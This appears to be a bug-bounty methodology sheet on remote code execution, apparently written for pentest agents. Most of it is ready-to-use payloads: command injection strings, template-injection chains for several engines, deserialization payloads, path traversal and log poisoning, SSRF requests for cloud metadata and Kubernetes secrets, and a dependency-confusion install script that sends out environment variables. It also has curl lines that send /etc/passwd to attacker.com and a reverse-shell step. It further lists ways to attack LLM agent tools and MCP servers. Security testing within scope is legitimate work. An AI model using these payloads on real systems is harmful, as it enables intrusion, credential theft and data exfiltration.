# Hunt RCE — Deep Methodology

**Version:** 2026.1
**Source:** 1,218-report distillation from H-mmer/pentest-agents hunt-rce skill, HackerOne disclosed reports 2024-2026, NVD CVE analysis

---

## Attack Theory

RCE is execution of attacker-controlled code on the target server process. Delivery mechanisms: command injection, SSTI, deserialization, unsafe file parsing, dependency confusion, SSRF→internal service exploitation. The target is always a sink that passes user input to an execution primitive.

**Kill signals (skip target):**
- No user-controlled input reaches any execution sink (no file upload, no template rendering, no command invocation, no deserialization)
- All execution sinks are hardened with allowlists (no metacharacters accepted)
- Target is static content only (no server-side processing)

## Sub-Techniques

### A. Command Injection
Direct OS command execution via shell metacharacters.
- Payloads: `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`, `%0aid`
- Blind: `; sleep 5`, `; curl attacker.com/$(id|base64)`
- Bypass: `$IFS`, `${IFS}`, `{cat,/etc/passwd}`, `'i'd`
- OOB confirmation via interactsh: `; curl https://CANARY.oast.fun`
- Common sinks: ping/nslookup/traceroute params, hostname/domain fields, SMTP "to" fields, filename passthrough to system tools (ffmpeg, imagemagick, unzip, tar)

### B. Server-Side Template Injection (SSTI)
Template engine interprets user input as template code.
- Detection: `{{7*7}}` → 49, `${7*7}` → 49, `<%= 7*7 %>` → 49
- Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- Velocity: `#set($x='')##$x.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')`
- Common sinks: email templates, PDF generation templates, notification templates, report builders, error pages with user input

### C. Unsafe Deserialization
Object deserialization from user input triggers gadget chains.
- Python: `pickle.loads(user_input)` — craft pickle with `__reduce__`
- Java: `ObjectInputStream.readObject()` — ysoserial gadget chains (CommonsCollections, Spring, Hibernate)
- PHP: `unserialize(user_input)` — PHPGGC gadget chains
- Node.js: `node-serialize`, `cryo` — `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`
- Detection: look for base64-encoded data in cookies/params matching `rO0AB` (Java), `O:` (PHP)
- Common sinks: session cookies, state restore endpoints, cache keys, webhook payload replays, model artifacts

### D. Path Traversal → RCE
Read sensitive files or write executable files via path traversal.
- Read: `../../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2fetc%2fpasswd`
- Write: upload to `/var/www/html/../upload/shell.php` — execute via HTTP
- Combination: read SSH key, cloud credentials, `.env` files
- Log poisoning: inject PHP/other code into logs via User-Agent, then include the log file

### E. Dependency Confusion / Supply Chain
Package managers resolve internal package names from public registries.
- Target: internal npm/pip/gem package names in package.json, requirements.txt, Gemfile
- Register: public package with same name, higher version
- Payload: install script that exfiltrates hostname + env vars
- Check tools: `check_dependency_confusion` (security-research MCP)

### F. SSRF → Internal Service RCE
SSRF reaching internal services that execute commands.
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Kubernetes: `http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets`
- Redis: `gopher://localhost:6379/_MULTI%0d%0aSET%0d%0ashell%0d%0a...`
- Memcached: set malicious value → deserialize trigger
- Admin panels: reach internal admin (Jenkins, Kibana, Grafana) and execute via known CVEs

### G. Agentic / LLM Tool RCE (2026 Priority)
LangChain/CrewAI tools execute OS commands from LLM output.
- CVE-2025-68613: LangChain PythonREPLTool semantic RCE — LLM generates Python that executes system commands
- BentoML pickle deserialization via model API — craft pickle payload in model artifact
- Tekton git argument injection — `git clone` with malicious repo URL containing `--upload-pack`
- Ollama model pull from attacker-controlled registry with malicious modelfile
- MCP servers: tool parameter schema injection, malicious tool response payloads

## CVE References (2024-2026)
- CVE-2025-55182 — RSC RCE via server component boundary bypass
- CVE-2025-68613 — LangChain PythonREPLTool semantic RCE
- CVE-2024-4367 — PDF.js arbitrary JS execution
- CVE-2024-34102 — Adobe Commerce SSRF→RCE (CosmicSting)
- CVE-2024-27198 — JetBrains TeamCity auth bypass → RCE

## Semgrep Patterns
```yaml
rules:
  - id: command-injection-sink
    patterns:
      - pattern: subprocess.run($CMD, shell=True, ...)
      - pattern: os.system($CMD)
      - pattern: eval($INPUT)
    message: Potential command injection sink
    
  - id: pickle-deserialization
    patterns:
      - pattern: pickle.loads($DATA)
    message: Unsafe deserialization — pickle.loads with user data
```

## Effective Payload Sequence
1. Blind OOB first: `; curl https://CANARY.interactsh.com/$(hostname|base64)` — confirms execution without response
2. Id confirm: `; id` — simple, low-noise
3. Exfil: `; curl https://attacker.com/$(cat /etc/passwd|base64 -w0)`
4. Reverse shell: only if PoC confirmed and scope explicitly allows active exploitation

## Reporting Bar (what separates a report from noise)
- **Confirmed execution** (OOB callback received or command output reflected) — not just payload reflection
- **Impact demonstrated**: data exfil, file read, or state change — not just `id` output
- **Scope-proof**: target in scope, no OOS assets touched
- **PoC reproducible**: exact request/response pair captured
- **CVSS ≥ 7.0** for RCE (8.0+ if no auth required)
